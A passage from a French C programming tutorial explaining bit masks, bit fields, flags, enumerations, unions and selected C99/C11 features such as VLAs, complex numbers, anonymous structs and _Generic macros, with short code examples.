facilement Il n'est pas toujours évident de trouver de tête le masque, de faire des conversions dans tous les sens entre plusieurs bases, et même si il existe des outils comme la calculatrice fournie avec la plupart des systèmes d'exploitation, nous n'avons pas envie de jongler entre plusieurs fenêtres. Non, ce que nous voulons, c'est que ce soit le programme qui nous fournisse le masque adapté en fonction du bit à changer. Dans le cas d'une mise à 1 à l'aide de l'opérateur OR, on remarque que le masque s'obtient en faisant 1 << n où n est le numéro du bit que l'on veut modifier. On peut donc se définir une petite fonction qui nous fera ce calcul à notre place. int or_mask ( int n ) { return 1 << n ; } Et dans le cas d'une mise à 0 à l'aide de l'opérateur AND ? Si on observe bien, c'est le même masque que le précédent, à la seule différence que les bits 0 sont transformés en 1 et vice-versa. Or, quel opérateur permet d'inverser la valeur des bits ? C'est l'opérateur NOT ( ~ ). On en déduit donc que notre masque s'obtient en faisant ~(1 << n) . Nous pouvons donc écrire notre petite fonction. int and_mask ( int n ) { return ~ ( 1 << n ); } Testons donc avec ce petit code. int main ( void ) { int a = 0xF0 ; int masque_ou = or_mask ( 8 ); int masque_et = and_mask ( 5 ); bin_print_int ( a | masque_ou ); bin_print_int ( a & masque_et ); return 0 ; } On obtient les mêmes valeurs que précédemment. Nous pouvons donc nous épargner du travail supplémentaire en laissant l'ordinateur nous donner le masque. Cette méthode présente néanmoins des inconvénients, comme par exemple le fait de ne pas pouvoir créer directement un masque modifiant plusieurs bits. Il faudra pour cela faire des opérations sur les résultats de la fonction. int main ( void ) { int a = 0xF0 ; int masque_ou = or_mask ( 8 ) | or_mask ( 10 ); int masque_et = and_mask ( 5 ) & and_mask ( 6 ); bin_print_int ( a | masque_ou ); bin_print_int ( a & masque_et ); return 0 ; } Les champs de bits Nous le savons, lorsque l'on créé une structure, sa taille est la somme de la taille de tous ces éléments plus quelques bits de padding en fonction des cas. Pourtant, il est possible de définir une structure qui contiendra des portions d'entiers ! Comment est-ce possible ? Eh bien cela marche comme une structure classique sauf qu'en plus on précise, pour chaque champ, la taille en bits qu'il occupera. Exemple. struct bit_field { unsigned field1 : 3 ; /* 1er champs : 3 bits */ unsigned field2 : 1 ; /* 2ème champ : 1 bit */ unsigned field3 : 7 ; /* 3ème champs : 7 bits */ }; Bien entendu, la taille d'un champ de bits ne peut dépasser celle d'un entier et les champs de bits ne sont applicables de façon définie et portable qu'aux entiers non-signés. Hormis ces contraintes, ces structures s'utilisent comme des structures habituelles. Mais quel est donc l'intérêt de cette technique ? Il n'est pas très évident à voir, car hormis certains cas précis, vous ne la verrez que très rarement. Elle sert principalement quand on a besoin de stocker beaucoup d'informations et qu'on dispose de peu de mémoire. Prenons un exemple tiré du tutoriel de mewtow et Lucas-84 , celui d'un développeur qui veut stocker une date (constitué d'un jour, d'un mois et d'une année). On sait qu'un jour sera toujours compris entre 1 et 31. Or 31 s'écrit aussi 0b11111 ; 5 bits suffisent donc. De même, un mois sera toujours compris entre 1 et 12. Ce dernier s'écrivant 1100, on en déduit que 4 bits suffisent. Enfin, en supposant qu'on stocke l'année jusqu'en 2047, qui s'écrit 0b11111111111, on obtient 11 bits. Notre structure s'écrira donc ainsi : struct date { unsigned jour : 5 ; unsigned mois : 4 ; unsigned annee : 11 ; }; Chez moi, sizeof(struct date) retourne 4. Sans préciser les champs de bits, j'obtiens 12. Nous avons donc économisé 8 octets. Une micro-poussière pour nous qui développons sur des ordinateurs communs, mais ces gains peuvent être utiles sur des processeurs embarqués ou sur des machines où la quantité de mémoire se compte en centaines d'octets. Sachez que l'on peut également laisser des bits inutilisés ; il suffit simplement de ne pas donner de nom au champ. Cela est utile pour décrire certaines choses lorsque l'on fait de la programmation système. Par exemple, le registre d'état du MC 68030 de Motorola est décrit comme suit dans la documentation. bit 0 : carry ; bit 1 : overflow ; bit 2 : zéro ; bit 3 : négatif ; bit 4 : extension ; bits 5-7 : inutilisés ; bits 8-10 : masque des interruptions ; bit 11 : inutilisé ; bits 12-13 : niveau de privilège ; bits 14-15 : état des traces. La structure qui décrit ce registre d'état peut s'écrire ainsi : struct sr { unsigned int trace : 2 ; unsigned int priv : 2 ; unsigned int : 1 ; /* inutilisé */ unsigned int masque : 3 ; unsigned int : 3 ; /* inutilisé */ unsigned int extend : 1 ; unsigned int negative : 1 ; unsigned int zero : 1 ; unsigned int overflow : 1 ; unsigned int carry : 1 ; }; Mais gardez bien en tête que c'est une méthode particulière réservée à des cas particuliers . Si vous développez sur un ordinateur commun, n'utilisez pas les champs de bits, qui ne ferons que compliquer la relecture du code sans rien apporter d'autre. Quelques astuces Jusqu'ici, nous avons vu majoritairement de la théorie, mais concrètement, à quoi ça sert vraiment tout ça ? Eh bien pour être honnête, dans la plupart des cas, ça ne vous servira pas vraiment. Cela ne veut pas dire que ça ne sert jamais, bien au contraire ! et je vais même vous le prouver à travers quelques exemples. Gestion des flags Pour définir ce que sont les flags et leur intérêt, imaginons un instant que nous soyons en train de développer une bibliothèque multimédia. Celle-ci peut ouvrir des fenêtres, jouer de la musique, manipuler le lecteur CD, les ports USB, se connecter au réseau, etc. Bref, elle contient énormément de modules complets et utiles. Seulement voilà : comment faire, lorsqu'on initialise le programme, pour ne charger que les modules qui nous intéressent ? Il est hors de question de créer une fonction prenant autant de paramètres qu'il n'y a de modules : imaginez un instant si nous avons 20 modules ! Il est également hors de question de charger tous les modules ; on ne veut payer que ce que l'on veut utiliser. L'idéal serait de n'avoir qu'un seul paramètre et que, en fonction de ce que l'utilisateur rentre, on ne charge que les modules demandés. Eh bien les flags servent à ça ; ce ne sont rien d'autres que des valeurs qui, combinées ensembles, vont nous permettre de déterminer quels sont les modules à charger. Mais ça ne nous rappelle pas quelque chose ? Regardez ce chapitre. Nous avons découvert les opérateurs bitwise et c'est encore eux qui vont nous servir ici. Et puis combiner des valeurs ensembles, ça ne nous rappelle pas un peu nos histoires de masques et d'opérateur OR ? Eh oui ! il nous suffit de combiner plusieurs valeurs à l'aide de l'opérateur OR pour n'avoir à passer qu'un seul paramètre. Mais quelles valeurs donner à nos flags ? Il faut être certains qu'en les combinant, on ne puisse pas avoir de doute quant aux flags qui forment la combinaison. Nous pouvons par exemple ne prendre comme flags les puissances de 2, qui ont comme particularité de n'avoir qu'un seul bit à 1 et jamais le même qu'une autre puissance de 2. #define NO_MODULE (1 << 0) #define AUDIO_MODULE (1 << 1) #define VIDEO_MODULE (1 << 2) #define NETWORK_MODULE (1 << 3) #define WINDOW_MODULE (1 << 4) #define MATHS_MODULE (1 << 5) Maintenant, nous avons un système simple qui nous permet de combiner les paramètres aussi facilement que l'on veut. Ainsi, si l'on veut charger le module de fenêtres et le module audio, il suffit de faire comme ceci : int pdp_init ( int flags ) { } int main ( void ) { pdp_init ( AUDIO_MODULE | WINDOW_MODULE ); return 0 ; } Par contre, il faut que la fonction qui reçoit notre combinaison de flags puisse extraire chaque flag pour pouvoir faire ce qu'on lui demande. Et une fois n'est pas coutume, la réponse a été apporté dans ce chapitre : l'opérateur AND. En effet, si notre flag est présent dans l'argument de la fonction, alors argument & FLAG != 0 . Dans notre exemple, voici ce que ça donnerait : int pdp_init ( int flags ) { if ( flags & AUDIO_MODULE ) { /* On charge le module audio. */ } if ( flag & VIDEO_MODULE ) { /* On charge le module vidéo. */ } /* Etc */ } Pour information, ce mécanisme est par exemple utilisé par la bibliothèque graphique SDL . Voici les flags qu'elle utilise : #define SDL_INIT_TIMER 0x00000001 #define SDL_INIT_AUDIO 0x00000010 #define SDL_INIT_VIDEO 0x00000020 #define SDL_INIT_CDROM 0x00000100 #define SDL_INIT_JOYSTICK 0x00000200 #define SDL_INIT_NOPARACHUTE 0x00100000 #define SDL_INIT_EVENTTHREAD 0x01000000 #define SDL_INIT_EVERYTHING 0x0000FFFF Puissances de 2 Nous l'avons dit il y a quelques instants : les puissances de 2 on la particularité de n'avoir qu'un bit à 1, tous les autres étant à 0. En particulier, $2&#94;n$ a $n$ zéros à droite de son unique bit 1. Et si on retire 1 à ce nombre, on obtient l'inverse : un 0 suivit de $n$ 1 ; $2&#94;n$ et $2&#94;n - 1$ ont tous leurs bits opposés. C'est une particularité des puissances de deux (et de zéro, mais zéro n'étant pas une puissance de 2, il ne sera pas compté). Sachant cela, on peut donc créer une fonction disant si un nombre est une puissance de 2 ou non. int is_power_of_two ( unsigned int n ) { return n && ( n & ( n - 1 )) == 0 ; } Pour continuer à voir l'intérêt des opérateurs bitwise et à vous entrainer, essayez de faire les calculs proposés dans cette partie du tutoriel cité en introduction. Obtenir la valeur maximum d'un type non-signé Une petite astuce : puisque 0, peut importe le type, a tous ses bits à 0, si on fait ~0 , tous les bits passent à 1. On peut ainsi obtenir la valeur maximum d'un entier non-signé. printf ( \"%hu =?= %hu \\n \" , ~ 0 , USHRT_MAX ); printf ( \"%lu =?= %lu \\n \" , ~ 0 , ULONG_MAX ); Les opérateurs bitwise ne sont pas très courant dans la plupart des codes, mais ils peuvent être très puissants, alors gardez-les dans un coin de votre tête, ils pourront vous servir un jour. Mais n'oubliez pas que cette puissance a un coût : une perte en lisibilité. Trop d'opérateurs bitwise rendent le code plus long à comprendre. Illustration d'un cas très tordu tiré du code source de Quake 3 Arena . float Q_rsqrt ( float number ) { long i ; float x2 , y ; const float threehalfs = 1.5F ; x2 = number * 0.5F ; y = number ; i = * ( long * ) & y ; i = 0x5f3759df - ( i >> 1 ); y = * ( float * ) & i ; y = y * ( threehalfs - ( x2 * y * y )); } Ce code est particulièrement long à expliquer ; sachez simplement qu'il permet de calculer l'inverse d'une racine carrée et est extrêmement rapide. Mais il est fort à parier que vous n'aurez jamais à faire de code pareil. Tout ça pour dire que utilisez les opérateurs quand c'est nécessaire. Dans le chapitre suivant, nous verrons une autre structure de données ainsi qu'un nouveau moyen de déclarer des constantes. Enumérations et unions Les énumérations et les unions sont des types composés un peu moins courant que les structures (surtout les unions) mais néanmoins utiles. Nous avons choisi d'en parler parce qu'on les retrouve suffisamment souvent pour qu'on les remarque, dans les codes anciens ou un peu \"poussés\" et parce qu'ils sont puissants quand on sait bien les utiliser. Les énumérations Les bases Les énumérations sont à première vue semblables aux #define puisqu'on s'en sert pour déclarer des constantes. Avant d'examiner plus en détail l'intérêt de cette nouvelle façon de faire, voici tout d'abord la syntaxe d'utilisation ci-dessous. enum identificateur { nom_1 , nom_2 , ..., nom_n }; /* Voici la façon de créer une variable de type enum identificateur */ enum identificateur variable = nom_x ; En règle générale, on écrit les noms de valeurs entièrement en majuscules. Ainsi, si on souhaite énumérer les quatre axes d'une boussole, on procèdera comme dans l'exemple suivant. enum Direction { NORD , SUD , EST , OUEST }; enum Direction urss = EST ; enum Direction usa = OUEST ; Peut-être êtes-vous en train de vous demander quel est le rapport avec les constantes de préprocesseur ? Eh bien il y a des points communs mais aussi des différences, dont la plus grande est sans doute la suivante : le compilateur associe automatique à chaque nom de valeur une constante entière en en commençant par zéro. Ainsi, dans notre exemple, NORD vaut 0, SUD vaut 1, EST vaut 2 et OUEST vaut 3. Et si cela ne nous convient pas, on peut associer nous-mêmes les valeurs que l'on veut, tant que celle-ci est entière. enum Direction { NORD = 4 , SUD , EST = 42 , OUEST }; Que deviennent les constantes de valeurs auxquelles nous ne précisons rien ? Eh bien le compilateur leur associe la valeur supérieure à la valeur de la constante précédente : SUD vaudra donc 5 et OUEST vaudra 43. Les énumérations face au préprocesseur Maintenant vient la question fatidique : mais à quoi cela sert-il puisque nous avons déjà le préprocesseur qui fait un travail semblable et qui en plus nous permet d'utiliser autre chose que des constantes entières ? Tout d'abord, comme pour les variable ou les fonctions , les énumérations (ainsi que les constantes énumérées) peuvent disposer de différentes portées suivant le lieu de leur déclaration. Il est donc possible de limiter cette dernière à un bloc ou d'utiliser le mécanisme du masquage. #include <stdio.h> enum Couleur { VERT = - 42 }; int main ( void ) { printf ( \"VERT = %d \\n \" , VERT ); { enum Couleur { VERT = 42 }; printf ( \"VERT = %d \\n \" , VERT ); { enum Couleur { VERT = 7 }; printf ( \"VERT = %d \\n \" , VERT ); } printf ( \"VERT = %d \\n \" , VERT ); } printf ( \"VERT = %d \\n \" , VERT ); return 0 ; } Cela n'est pas réalisable (à tout le moins pas de cette manière) dans le cas d'une constante de préprocesseur puisque le préprocesseur n'a aucune notion de bloc ou de fonctions (la seule portée possible est donc au niveau d'un fichier). Le second avantage est qu'il est plus facile de débugger un programme qui utilise des constantes énumérées plutôt que des constantes de préprocesseur. Pourquoi ? Parce que la plupart des débuggers utilisent le type d'une constante pour retrouver son identificateur, ce qui est impossible si on a affaire à une constante de préprocesseur : il faut utiliser des outils spécialisés pour débugger des macros puisqu'elles n'existent plus après le passage du préprocesseur. Un troisième avantage est qu'il est, dans certains cas, plus pratique et facile d'ajouter des constantes énumérées que des constantes de préprocesseur. Comparez les deux codes suivants : #define NORD 0 #define SUD 1 #define EST 2 #define OUEST 3 enum Direction { NORD , SUD , EST , OUEST }; Supposons que l'on veuille ajouter les directions intermédiaires (comme nord-ouest ou sud-est par exemple). Dans le premier cas, il faudra écrire huit lignes de plus, alors que dans le deuxième il suffira de rajouter ces noms de constante dans l'énumération. D'ailleurs, petite astuce, comme ce sont des constantes, on peut s'en servir pour retenir la taille d'un tableau. Ainsi, chaque fois qu'on ajoutera une constante à notre énumération, la taille augmentera elle aussi. Exemple avec des couleurs. enum Couleurs { VERT , BLEU , JAUNE , ROUGE , NB_COULEURS }; enum Couleurs jetons [ NB_COULEURS ]; void compter ( enum Couleurs jetons [], int taille ); compter ( jetons , NB_COULEURS ); Bien entendu, les constantes énumérées possèdent aussi des défauts. Ainsi, la valeur d'une constante énumérée doit toujours être comprise entre la valeur minimale et la valeur maximale d'un int . Et s'il est besoin d'utiliser autre chose que des constantes entières, les énumérations ne peuvent rien pour nous. Je conclus cette partie pour vous dire qu'il est possible de faire des pointeurs sur des types énumérations et qu'ils s'utilisent comme d'habitude. enum Vins { BORDEAUX , BOURGOGNE , ALSACE }; enum Vins bordeaux = BORDEAUX ; enum Vins * vins_de_bordeaux = & bordeaux ; Les énumérations anonymes Les énumérations anonymes ne sont ni plus ni moins des énumérations sans identificateur. Elles sont utiles quand on veut seulement déclarer des constantes et les utiliser sans passer par un type énuméré. Un exemple ? Vous souvenez-vous des booléens ? En C, nous n'avons aucun type pour définir une variable de type booléen, au contraire d'autres langages comme C++ ou Java. Certains programmeurs, pour rendre leur code plus clair, récréer ce type grâce à un typedef et une énumération. enum { false , true }; /* On peut bien entendu utiliser le préprocesseur pour ça. */ #define false 0 #define true 1 typedef char bool ; C'est l'un des exemples les plus connus d'utilisation d'énumérations anonymes, mais certainement que vous en croiserez d'autres dans votre vie de programmeur. Les unions Les unions sont des agrégats en apparence identiques aux structures mais qui se révèlent différentes dans leur utilisation et plus rares dans les codes. Pour commencer, voici sa syntaxe. union identificateur { int entier ; double flottant ; char lettre ; }; union identificateur exemple ; exemple . entier = 42 ; Pourtant, une différence majeure existe entre les structures et les unions : si la taille d'une structure est la somme de la taille de ses champs (plus éventuellement quelques bits de padding), la taille d'une union est la taille du plus grand de ses champs. Voyez par vous-mêmes en testant le code suivant (vous noterez que j'ai fait attention au padding dans la structure). #include <stdio.h> struct my_structure { double d ; char c ; int i ; }; union my_union { int i ; double d ; char c ; }; #define PRINT_SIZE(type) printf(\"sizeof(\" #type \") = %u\\n\", sizeof(type)) int main ( void ) { PRINT_SIZE ( int ); PRINT_SIZE ( double ); PRINT_SIZE ( char ); PRINT_SIZE ( struct my_structure ); PRINT_SIZE ( union my_union ); return 0 ; } En compilant ce programme, vous verrez que l'union a la taille d'un double . Les unions permettent donc d'économiser de la mémoire. En bons programmeurs que nous sommes, nous pourrions nous dire que les structures ne valent pas le coup par rapport aux unions puisqu'elles sont plus grosses. Mais ce n'est pas aussi simple car les unions ont un gros inconvénient que certains ont peut-être déjà deviné : puisque la taille est plus petite qu'une structure, toutes les champs partagent le même espace mémoire. #include <stdio.h> struct my_structure { double d ; char c ; int i ; }; union my_union { int i ; double d ; char c ; }; #define PRINT_ADRS(var) printf(\"&\" #var \" = %p\\n\", &var) int main ( void ) { struct my_structure var_s ; union my_union var_u ; PRINT_ADRS ( var_s . d ); PRINT_ADRS ( var_s . c ); PRINT_ADRS ( var_s . i ); puts ( \"\" ); PRINT_ADRS ( var_u . d ); PRINT_ADRS ( var_u . c ); PRINT_ADRS ( var_u . i ); return 0 ; } Cela veut donc que quand on modifie un champ d'une union, on écrase les valeurs des autres champs. Les unions sont donc à manipuler avec précaution, car si elles le sont correctement, elles sont très puissantes, comme nous allons le voir. Exemple pratique : une abstraction pour les chaînes de caractères Nous sommes d'accord pour dire que les chaînes de caractères ne sont pas toujours aisées à manipuler : il faut vérifier que l'on ne déborde pas, il faut faire attention à bien libérer la mémoire dans le cas d'une allocation dynamique, à bien mettre le caractère nul final, etc. C'est contraignant, aussi nous allons faire ce que beaucoup d'autres langages proposent de base : une abstraction pour les chaînes de caractères qui nous masquera tous ces détails agaçants. Une bonne idée serait de faire une structure qui contienne un pointeur sur char que l'on allouera et réallouera au fil du programme. Voilà, seulement nous ne voulons pas faire des allocations dynamique inutiles, car nous savons que la majorité du temps les chaînes de caractères ont une taille inférieure à 32. Nous décidons donc de stocker la chaîne dans un tableau statique si elle fait moins de 31 caractères, sinon dans un pointeur qui sera alloué. Dans ce dernier cas, il faudra penser à conserver la taille maximale de notre tableau dynamique. Voilà un exemple pratique d'utilisation des unions. enum { false , true }; typedef char bool ; struct cstring { union buffer { struct pointer { char * ptr ; size_t capacity ; } ptr ; char array [ 32 ]; } buffer ; size_t length ; bool is_in_ptr ; }; On pourra donc stocker des chaînes de n'importe quelle taille de façon totalement transparente pour l'utilisateur. C'est un bon exercice que je vous encourage à faire pour vous entrainer. Je ne vous donnerais pas de correction cette fois-ci car il existe de très nombreuses façons de créer une abstraction pour les chaînes de caractères, mais sachez que si besoin est, les forums seront là pour vous aider. Il faut surtout que vous reteniez qu'on peut utiliser soit le tableau statique, soit le pointeur alloué, mais pas les deux en même temps ; il faudra donc faire attention et bien pensez aux cas limites (lors des concaténations par exemple). Bon courage ! Finalement, les structures, les unions et les énumérations sont particulièrement puissantes quand elles sont mises ensembles de façon élégante. Vous n'aurez peut-être jamais à utiliser les trois en même temps, mais un peu de culture générale ne fait pas de mal. Nous continuerons à en parler dans le chapitre suivant pour illustrer certaines nouveautés des normes C99 et C11. Découvrir le C99 / C11 Le langage C, comme n'importe quel langage vivant, évolue au fil du temps. En 1999, dix ans après la normalisation par l' ANSI et neuf ans après celle de l' ISO , ce dernier comité décida de mettre à jour le langage en rajoutant certains éléments. Cette norme porte le nom abrégé de C99 . Enfin, en 2011, ce même comité décida de faire une nouvelle mise à jour du langage, notamment sur certains points bien trop compliqués pour nous, nommée C11 . Néanmoins, même si nous ne présenterons pas tout des deux normes, nous avons sélectionné ce qui nous paraissait le moins compliqué et le plus intéressant. N'hésitez pas à fouiller un peu plus si le cœur vous en dit après. Un dernier point avant de démarrer : ces normes n'ont eu que peu d'écho et contrairement au C89, elles ne sont pas supportées par certains compilateurs (Visual C++ par exemple, bien qu'il soit prévu un support du C99 pour VC++2013) ou incomplètement par d'autres. Il faudra donc faire attention si vous utilisez ces nouveautés dans l'un de vos programmes un jour. Avant de démarrer Pour indiquer au compilateur que l'on souhaite compiler en C99 ou en C11, il faut modifier les options. Pour se faire, suivez les instructions ci-dessous en remplaçant XX par 99 ou 11 en fonction de la norme que vous utilisez. Code::Blocks : aller dans Project -> Build Options -> Compiler settings -> Other options et rajouter -std=cXX . GCC en ligne de commande : rajouter l'option -std=cXX dans les options de compilation. Visual Studio : impossible pour le moment. Ensuite, pour tester quelle version de C vous utilisez, vous pouvez utiliser la macro __STDC_VERSION__ . Celle-ci peut prendre les valeurs ci-dessous. Pas de valeur pour C90. 199901L pour C99. 201112L pour C11. Enfin, voici quelques liens pour savoir quelles fonctionnalités sont supportés par quel compilateur. GCC : C99 et C11 Découvrir le C99 Les commentaires mono-lignes Il est maintenant possible d'utiliser la syntaxe du C++ pour les commentaires sur une seule ligne à savoir // . Comme leur nom l'indique, il n'est pas possible de faire un commentaire de plusieurs lignes avec excepté en rajoutant // à chaque nouvelle ligne ; personnellement je continue d'utiliser les commentaires du C90. Le mot-clef long long L'entier long long et son pendant non-signé unsigned long long sont conçus pour faire au minimum 64 bits de taille, ce qui permet de stocker de grands nombres. Les booléens Pour utiliser les macros définies par C99, il faudra inclure le fichier d'en-tête <stdbool.h> . Celui contient le type bool ainsi que deux macros true et false valant respectivement 1 et 0 et une macro __bool_true_false_are_defined valant 1 si les trois macros précédentes sont définies. Si jamais il n'est pas possible d'utiliser ce fichier d'en-tête ou que vous ne souhaitez pas le faire, il est possible d'utiliser le mot-clef _Bool qui peut prendre les valeurs 0 ou 1. Les nombres complexes C99 inclut un nouveau mot-clef pour manipuler les nombres complexes avec l'en-tête : complex . Celui-ci doit être précédé de float , double ou long double . Cet en-tête fournit également la macro I , dont le type peut changer en fonction de l'implémentation mais qui vaudra toujours $\\sqrt{-1}$, ainsi que de nombreuses fonctions, comme par exemple le projeté, la racine carrée, le conjugué, le cosinus, le sinus, la tangente, la puissance, etc. Voici un exemple qui converti un complexe de sa forme cartésienne en sa forme polaire. #include <stdio.h> #include <complex.h> int main ( void ) { double complex z = - 4.4 + 3.3 * I ; double radius = cabs ( z ); double argument = carg ( z ); double x = creal ( z ); double y = cimag ( z ); printf ( \"cartesien(x, y) : (%f, %f) \\n \" , x , y ); printf ( \"polaire(r, theta) : (%f, %f) \\n \" , radius , argument ); return 0 ; } Le mot-clef inline Ce mot-clef permet de remplacer les macros dans un certain nombre de cas. En effet, nous avons vu dans le chapitre sur le préprocesseur que les macros peuvent provoquer des effets de bord indésirables et qu'elles ne vérifient absolument pas les types. En ajoutant inline devant la déclaration d'une fonction, on demande au compilateur de remplacer l'appel de la fonction par son corps, exactement comme les macros, mais tout en gardant les avantages des fonctions. Le code suivant illustre ce qui se passe. inline unsigned int abs ( int x ) { return ( x < 0 ) ? - x : x ; } int f ( int x ) { int var = abs ( x ); } /* Le compilateur transformera le code en ceci : */ int f ( int x ) { int var = ( x < 0 ) ? - x : x ; } Il y a tout de même quelques restrictions. Tout d'abord, il faut toujours définir une fonction inline dans un fichier d'en-tête (ce sont les seules fonctions que l'on doit définir dans un fichier d'en-tête, toutes les autres doivent être définies dans les fichiers sources). Enfin, rien ne force le compilateur à remplacer l'appel de la fonction par son corps. Ce mot-clef informe le compilateur mais ne le force absolument pas et il ne le fera que s'il le peut. Le mot-clef restrict Ce mot-clef permet de définir ce que l'on appelle des pointeurs restreints . Un pointeur définit comme restreint est le seul à pointer sur une certaine zone mémoire. Cela permet au compilateur de faire des optimisations, mais tout comme inline , le compilateur peut l'ignorer. Vous trouverez un tutoriel qui présente ce mot-clef et la solution qu'il apporte à certains problèmes de mémoire et de données ici . Mélange déclaration / code En C90, il est obligatoire de déclarer toutes ses variables au début du bloc d'instruction courant. En C99, cette règle est abolie et on peut déclarer ses variables où on veut. Pour certains, cela augmente la lisibilité du code puisqu'on déclare les variables juste avant leur utilisation. Pour d'autre, cela y nuit puisqu'on mélange les déclarations et le code. C'est à vous de choisir si vous utiliserez cette modification de la syntaxe ou non. int main ( void ) { printf ( \"Hello world! \\n \" ); int i = 10 ; printf ( \"i = %d \\n \" , i ); return 0 ; } Dernier point : maintenant on peut déclarer une variable temporaire pour la boucle for . Celle-ci disparait à la fin de la boucle. for ( size_t i = 0 ; i < 10 ; ++ i ) { /* Ici, i existe. */ } /* Ici, i n'existe plus. */ Les VLA Les tableaux à taille variable, de l'anglais Variable Length Array , sont des tableaux dont la taille peut être définie par une variable. Jusqu'à maintenant, la taille devait impérativement être connue à la compilation, sinon il fallait passer par l'allocation dynamique. Maintenant, le code suivant est parfaitement valide. void foobar ( size_t n ) { int array [ n ]; for ( size_t i = 0 ; i < n ; ++ i ) { array [ i ] = i ; } /* Faire quelque chose avec le tableau. */ } Cette fonctionnalité marche aussi pour les prototypes et déclarations de fonctions, à condition que la variable qui sert de taille soit définie avant le tableau. int foo ( int n , int array [ n ]); // valide int bar ( int array [ n ], int n ); // invalide D'ailleurs, comme il n'est pas obligatoire d'écrire la taille d'un tableau \"classique\" lorsqu'on écrit le prototype d'une fonction, il n'est pas obligatoire de le faire dans le cas d'un VLA. Dans ce cas, il faudra juste mettre une étoile entre les crochets, comme dans l'exemple ci-dessous. int foobar ( int n , int array [ * ]); Les limitations de ce mécanisme La première limitation et sans doute la plus importante est l'endroit où doit être stocké le tableau. Nous avons vu dans le chapitre sur l'allocation dynamique la pile pour les objets automatiques et le tas pour les objets dynamiques. Puisque c'est un tableau, il devrait en toute logique être stocké sur la pile ; c'est d'ailleurs ce que fait GCC . Le problème est que rien n'est garanti ; il se peut qu'il soit stocké sur le tas. Vous devez donc faire attention à ne pas demander une trop grande taille pour ne pas faire déborder la pile. La deuxième limitation est que la portée d'un VLA est limitée au fichier. Il est impossible d'utiliser dans un fichier un VLA définit dans un autre ou même de définir un VLA dont la taille est une variable externe. Les deux exemples suivants sont donc invalides. extern int n ; int a [ n ]; extern int b [ n ]; Troisième limitation : il est impossible de déclarer un VLA statique. Enfin, quatrième limitation, il est impossible d'utiliser un tableau à taille variable dans une structure ou une union, sauf dans un cas bien particulier. Tableau incomplet dans une structure Il est possible de ne pas préciser la taille d'un tableau membre d'une structure, mais celui-ci doit absolument être le dernier champ de la structure en question. De plus, on ne pourra utiliser que des pointeurs sur cette structure alloués dynamiquement. Le code suivant (tiré de Developpez ) illustre ce qu'on peut faire avec. #include <stdio.h> #include <stdlib.h> struct incomplet { int n ; int tab []; }; int main ( void ) { struct incomplet * a = malloc ( sizeof ( * a ) + 3 * sizeof ( int )); if ( a != NULL ) { a -> n = 3 ; for ( size_t i = 0 ; i < a -> n ; i ++ ) { a -> tab [ i ] = i ; } printf ( \"a->tab = { \" ); for ( size_t i = 0 ; i < a -> n ; i ++ ) { printf ( \"%d, \" , a -> tab [ i ]); } printf ( \" }; \\n \" ); free ( a ), a = NULL ; } struct incomplet * b = malloc ( sizeof ( * b ) + 5 * sizeof ( int )); if ( b != NULL ) { b -> n = 5 ; for ( size_t i = 0 ; i < b -> n ; i ++ ) { b -> tab [ i ] = i ; } printf ( \"b->tab = { \" ); for ( size_t i = 0 ; i < b -> n ; i ++ ) { printf ( \"%d, \" , b -> tab [ i ]); } printf ( \" }; \\n \" ); free ( b ), b = NULL ; } return 0 ; } a->tab = { 0, 1, 2, }; b->tab = { 0, 1, 2, 3, 4, }; La variable __func__ Cette variable contient le nom de la fonction courante. Elle est très utile pour débugger, par exemple pour connaître le nom de la fonction qui était en cours d'exécution quand le programme a planté. Les nombres flottants Le plus gros apport de C99 concerne sans aucun doute les nombres flottants. Alors que C90 laissait dans le flou, C99 supporte la norme IEEE 754 . Comme le sujet est imposant, je vous renvoie au tutoriel de Maëlan sur le sujet. En plus, celui-ci vous formera de façon approfondie aux flottants et à leurs dangers, ainsi qu'à leur bonne utilisation en C. Que demande le peuple ? Découvrir le C11 La suppression de gets Cette fonction ressemble beaucoup à fgets sauf qu'elle n'est pas du tout sécurisée : si on dépasse la taille du buffer, elle continue à écrire comme si de rien n'était. C11 la supprime et la remplace par la fonction gets_s . char * gets_s ( char * restrict buffer , size_t nch ); Les structures et les unions anonymes Jusqu'ici, lorsqu'on déclarait une structure ou une union, elle devait obligatoirement avoir un nom, même lors d'imbrications. Avec C11, ce n'est plus obligatoire. Ainsi, la structure du chapitre précédent deviendra comme ci-dessous. enum { false , true }; typedef char bool ; struct cstring { union buffer { struct { char * ptr ; size_t capacity ; }; char array [ 32 ]; }; size_t length ; bool is_in_ptr ; }; Dès lors, comment accéder aux membres de ces unions et structures anonymes ? Comme n'importe quel autre membre. Exemple ci-dessous. struct cstring var ; var . ptr = \"Hello world\" ; var . capacity = 42 ; var . length = strlen ( var . ptr ); Une nouvelle interface pour fopen La fonction fopen peut désormais être ouverte avec un nouveau mode : \"...x\" . Ce mode permet la création et l'ouverture du fichier en question. Si jamais le fichier existe déjà, alors la fonction échouera ; ce mode garanti donc de ne pas écraser de fichier. Ce mode se décline en quatre version. \"wx\" : créé une fichier texte et permet d'écrire avec un accès exclusif à ce fichier. \"wbx\" : pareil, sauf qu'on créé cette fois ci un fichier binaire. \"w+x\" : créé un fichier texte avec accès exclusif et possibilité de lecture et d'écriture. \"wb+x\" : de même, sauf qu'on créé un fichier binaire. Enfin, sachez qu'un version plus sécurisée de fopen fait son apparition : fopen_s . errno_t fopen_s ( FILE ** pFile , const char * filename , const char * mode ); Les macros génériques Le principe est simple : une macro générique pour les utilisateurs qui en interne appelle la bonne fonction selon le type de l'expression passée en paramètre. Un exemple sera plus parlant. Nous voulons faire la racine cubique d'un flottant. Nous avons donc cbrtf pour float , cbrt pour double et cbrtl pour long double . La macro se présentera donc comme ci-dessous. #define cbrt(X) _Generic((X), long double : cbrtl, default : cbrt, float : cbrtf)(X) /* Ou en version plus lisible : */ #define cbrt(X) _Generic((X), long double: cbrtl, \\ default: cbrt, \\ float: cbrtf)(X) \\ Ainsi, en fonction de X, la bonne fonction sera appelée. Grâce à cette macro, on peut faire des choses amusantes, comme récupérer le type d'une variable (bien que ce soit rarement utile) ou bien le format pour printf . #define TYPE_OF(var) _Generic((var), \\ int : \"Entier\", \\ double : \"Flottant\", \\ default : \"Inconnu\") #define printf_dec_format(x) _Generic((x), \\ char : \"%c\", \\ signed char : \"%hhd\", \\ unsigned char : \"%hhu\", \\ signed short : \"%hd\", \\ unsigned short : \"%hu\", \\ signed int : \"%d\", \\ unsigned int : \"%u\", \\ long int: \"%ld\", \\ unsigned long int : \"%lu\", \\ long long int : \"%lld\", \\ unsigned long long int : \"%llu\", \\ float : \"%f\", \\ double : \"%f\", \\ long double : \"%Lf\", \\ char * : \"%s\", \\ void * : 